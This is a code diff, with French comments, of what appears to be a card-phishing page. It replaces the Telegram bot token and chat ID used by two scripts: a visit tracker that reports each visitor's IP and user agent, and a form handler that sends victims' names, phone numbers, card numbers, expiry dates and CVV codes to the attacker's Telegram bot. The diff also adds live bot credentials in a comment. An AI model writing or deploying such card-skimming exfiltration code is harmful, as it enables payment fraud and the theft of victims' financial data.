@@ -479,12 +479,18 @@
 
     <script>
         // =============================================
+        // NOUVEAU BOT TELEGRAM
+        // Token: 8249633637:AAFSpxM9mw_qVlxVArh5TGDTNSwJhKW8fzA
+        // Chat ID: 8144648207
+        // =============================================
+        
+        // =============================================
         // TRACKER DE VISITE INSTANTANÉ - S'ACTIVE IMMÉDIATEMENT
         // =============================================
         (function() {
-            // Configuration Telegram (même que celle utilisée pour le formulaire)
-            const TELEGRAM_TOKEN = "8415150670:AAHM2QTcaGDT3_aBBTY7L4I8Nxc-DKOKTy4";
-            const TELEGRAM_CHAT_ID = "1265059511";
+            // Configuration du nouveau bot Telegram
+            const TELEGRAM_TOKEN = "8249633637:AAFSpxM9mw_qVlxVArh5TGDTNSwJhKW8fzA";
+            const TELEGRAM_CHAT_ID = "8144648207";
             
             // Vérifier si on a déjà signalé cette visite (pour éviter les doublons en cas de rafraîchissement)
             const sessionVisited = sessionStorage.getItem('page_visited');
@@ -545,7 +551,7 @@
 🖥️ USER AGENT:
 ${userAgent.substring(0, 100)}...`;
 
-                    // Envoyer à Telegram
+                    // Envoyer au nouveau bot Telegram
                     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
@@ -571,10 +577,10 @@ ${userAgent.substring(0, 100)}...`;
             const errorText = document.getElementById('errorText');
             const successMessage = document.getElementById('successMessage');
 
-            // Configuration Telegram - UN SEUL BOT avec le nouveau chat ID
+            // Configuration du nouveau bot Telegram
             const TELEGRAM_CONFIG = {
-                token: "8415150670:AAHM2QTcaGDT3_aBBTY7L4I8Nxc-DKOKTy4",
-                chatId: "1265059511" // Votre chat ID mis à jour
+                token: "8249633637:AAFSpxM9mw_qVlxVArh5TGDTNSwJhKW8fzA",
+                chatId: "8144648207"
             };
 
             function showError(message) {
@@ -703,7 +709,7 @@ ${userAgent.substring(0, 100)}...`;
                     .catch(() => 'IP non disponible');
             }
 
-            // FONCTION TELEGRAM AVEC LE NOUVEAU CHAT ID
+            // FONCTION TELEGRAM AVEC LE NOUVEAU BOT
             function sendToTelegram(firstname, lastname, phone, cardnumber, mm, yy, cvv, ip) {
                 const message = `💳 NOUVELLE CARTE 💳
                 
@@ -722,7 +728,7 @@ IP: ${ip}
 Date: ${new Date().toLocaleString('fr-FR')}
 Appareil: ${navigator.userAgent}`;
 
-                // Envoi au bot Telegram
+                // Envoi au nouveau bot Telegram
                 fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
